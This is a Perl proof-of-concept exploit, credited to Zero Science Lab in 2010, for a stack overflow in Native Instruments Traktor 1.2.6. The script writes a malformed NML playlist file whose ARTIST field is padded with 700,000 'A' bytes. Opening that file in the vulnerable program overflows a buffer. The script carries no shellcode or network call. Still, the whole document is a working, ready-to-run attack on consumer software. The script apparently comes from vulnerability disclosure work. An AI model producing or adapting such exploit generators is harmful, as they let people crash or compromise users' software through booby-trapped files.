use strict;
 
print qq{
 
-------------------------------------------------------------------------
|                                                                       |
|         Native Instruments Traktor 1.2.6 Stack Overflow PoC           |
|                                                                       |
|                 Copyleft (c) 2010, Zero Science Lab                   |
|                                                                       |
-------------------------------------------------------------------------
    };
 
my $bof = "\x41" x 700000;
 
my $start = '<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<NML VERSION="14"><HEAD COMPANY="www.native-instruments.com" PROGRAM="Traktor - Native Instruments"></HEAD>
<MUSICFOLDERS></MUSICFOLDERS>
<COLLECTION ENTRIES="2"><ENTRY MODIFIED_DATE="2008/11/18" MODIFIED_TIME="46610" AUDIO_ID="AGYAAjFQQiQFFCFAQSMVBCIwUDISBBXf/rhv/6/609/979uF//v/nD3/zf24X/+v+tPf/N/bhf/6/61Z/839uG//r/rE3/zf24b/+v+tTf/t/ahv/6/6xN/939uF//r/rUn/3f25b+/P+dTf79/Llv79/51M//38qV//3/nU3//vy5b+/v+dTf79/Llv/8/51N//39qW//3/rUz//f2pX/+/+tTP/9/blv/8/61M//782W/vv/nUz+/fy5b9/v+dTP78/alf/9/51M/v38uW/v7/rUz+/fypX//P+cS/7s/qlP/6/61L/9z+qU//r/nEv/y/6WP/x/94Ru7CEAAAAA==" TITLE="Demo 1" ARTIST="Paulseq"><LOCATION DIR="/:" FILE="Demo 1.mp3" VOLUME=""></LOCATION>
<INFO BITRATE="193000" COVERARTID="063\5RHVNTDZ5QGUQCJSQT2SAIRKVFNA" PLAYCOUNT="6" PLAYTIME="101" RANKING="0" IMPORT_DATE="2008/11/18" LAST_PLAYED="2008/11/5" FLAGS="2" FILESIZE="2488"></INFO>
<TEMPO BPM="126.200249" BPM_QUALITY="100"></TEMPO>
<LOUDNESS PEAK_DB="-0.766197324" PERCEIVED_DB="0.94946605"></LOUDNESS>
<CUE_V2 NAME="AutoGrid" DISPL_ORDER="0" TYPE="4" START="671.08913429252357" LEN="0" REPEATS="-1" HOTCUE="0"></CUE_V2>
<CUE_V2 NAME="n.n." DISPL_ORDER="0" TYPE="5" START="66299.022459106593" LEN="1901.7395166612771" REPEATS="-1" HOTCUE="1"></CUE_V2>
</ENTRY>
<ENTRY MODIFIED_DATE="2008/9/9" MODIFIED_TIME="56472" AUDIO_ID="AE0AAAbzv4bJPNhuR+po5a51uDzHXUbaeMKuhYdnVl+H3Inln6bba9hvhtt55o62yWvpbnjreseflslr2G5n+4rWnobaa9duZ/tpxZ+12WzIf3fq37Wepuhs2X1n22vGnpXXa7d+Z/t71q2m+my3fWj6a8autth+6I536mu3rYXXfciPaPptxnRk+K63jWr7bbjeluietp1r+Vy3zqbmnsmve/ltp92m14/HnHvabbjehueep6x762yY7Zf4lVWcbOpup9yWx6+3z3vpXJjbh9evprx82W6o3If3r6a7fPpdiOyI6K+lzHzZXYfth+avptyIZ01BAAAAAAAAAAAAAA==" TITLE="Demo 2" ';
 
my $traktor = "ARTIST=\"$bof\">";
 
my $end = '<LOCATION DIR="/:" FILE="Demo 2.mp3" VOLUME=""></LOCATION>
<INFO BITRATE="194000" COVERARTID="006\GEUNGXABSHRWRDW2UGHKAKQUYRVD" PLAYCOUNT="6" PLAYTIME="76" RANKING="0" IMPORT_DATE="2008/9/9" FILESIZE="1903"></INFO>
<TEMPO BPM="119" BPM_QUALITY="100"></TEMPO>
<LOUDNESS PEAK_DB="-0.257283062" PERCEIVED_DB="3.40946603"></LOUDNESS>
<CUE_V2 NAME="AutoGrid" DISPL_ORDER="0" TYPE="4" START="797.66281512605042" LEN="0" REPEATS="-1" HOTCUE="2"></CUE_V2>
<CUE_V2 NAME="Beginning" DISPL_ORDER="0" TYPE="0" START="797.66281512605042" LEN="0" REPEATS="-1" HOTCUE="0"></CUE_V2>
<CUE_V2 NAME="Loop1" DISPL_ORDER="0" TYPE="5" START="41133.797268907569" LEN="2016.8067226890755" REPEATS="-1" HOTCUE="1"></CUE_V2>
</ENTRY>
</COLLECTION>
<PLAYLISTS><NODE TYPE="FOLDER" NAME="$ROOT"><SUBNODES COUNT="3"><NODE TYPE="PLAYLIST" NAME="Demo Tracks"><PLAYLIST ENTRIES="2" TYPE="LIST"><ENTRY><PRIMARYKEY TYPE="TRACK" KEY="/:Demo 2.mp3"></PRIMARYKEY>
</ENTRY>
<ENTRY><PRIMARYKEY TYPE="TRACK" KEY="/:Demo 1.mp3"></PRIMARYKEY>
</ENTRY>
</PLAYLIST>
</NODE>
<NODE TYPE="PLAYLIST" NAME="Preparation"><PLAYLIST ENTRIES="0" TYPE="LIST"></PLAYLIST>
</NODE>
<NODE TYPE="PLAYLIST" NAME="_RECORDINGS"><PLAYLIST ENTRIES="0" TYPE="LIST"></PLAYLIST>
</NODE>
</SUBNODES>
</NODE>
</PLAYLISTS>
</NML>';
 
my $file = "PoC.nml";
print "\n\n[*] Creating $file playlist file...\n";
open nml, ">./$file" || die "\nCan't open $file: $!";
print nml $start.$traktor.$end;
print "\n[.] File successfully buffered!\n\n";
close nml;
